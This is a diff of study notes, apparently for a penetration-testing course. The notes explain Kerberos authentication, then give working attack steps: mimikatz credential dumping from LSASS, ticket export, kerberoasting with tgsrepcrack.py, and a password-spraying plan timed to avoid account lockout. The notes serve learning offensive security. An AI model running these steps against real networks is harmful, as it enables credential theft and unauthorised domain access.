@@ -40,11 +40,12 @@ authentication
 			encrypted by a secret key
 
 service ticket granting
-	1. ticket granting service request from client to KDC
+	1. ticket granting service(TGS) request from client to KDC
 		current user & timestamp
 			encrypted using the session key
-		the SPN of that resource
+		the service principal name(SPN) of that resource
 		encrypted TGT
+
 	2. verification
 		SPN exists in the domain
 		the TGT is decrypted using the secret key
@@ -65,16 +66,74 @@ service authentication
 		username
 		time stamp
 			encrypted with the session key(service ticket's)
+
 	2.authentication
 		decrypts the service ticket using service account password hash
 			extracts the suername and the session key
 		decrypt the username from the application request
 			using the extracted session key
+
 	3. service authentication from application server to client
 		inspects the supplied group memberships in the service ticket
-		assigns appropriate permissions to the user user
+		assigns appropriate permissions to the user
 
 =======================================
 cached credential storage and retrieval
 =======================================
+when user loged in, the credential must be stored somewhere
+the cached credential is stored in local security authority subsystem service(LSASS)
 
+mimikatz.exe(run with administrative user)
+	get debug privilege
+		# privilege::debug
+		result : Privilege '20' OK
+	dump the credentials of all logged-on users
+		# sekurlsa::logonpasswords
+	get tickets(TGT, TGS) of current user
+		# sekurlsa::tickets
+		using TGT, can request other TGS
+
+=======================
+service account attacks
+=======================
+request the service ticket
+	load kerberos request security token class
+		PS> Add-Type -AssemblyNames System.IdentityModel
+	call kerberos requestor security token constructor
+		PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/<SPN>'
+	list cached tickets for the current user
+		PS> klist
+
+download the service tickets
+	mimikatz.exe
+		# kerberos::list /export
+
+decrypt the ticket and crack the hash
+	*not need to get administrative privilege for this attack
+	kerberoasting
+		decrypt with brute-forcing or guessing
+		1. sent the hash to the attacker
+		2. run the kerberoast
+			python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <hash file>
+
+==============================
+low and slow password guessing
+==============================
+brute-forcing method occurs lockout of the account & alert to the administrator
+
+1. look at the domain's account policy
+	PS> net accounts
+		lockout threshold : after this, the login is locked out
+		lockout observartion window : after this, we get free login attempt
+2. make a plan
+	try in a row = lockout threshold - 1
+	do the tries after each lockout observation window time
+
+3. make a script
+	enumerate
+		enumerateADpassword.ps1
+	find users that are using specific password
+		Spray-Passwords.ps1
+		options
+		-Pass <password> : single user test
+		-Admin : test admin accounts
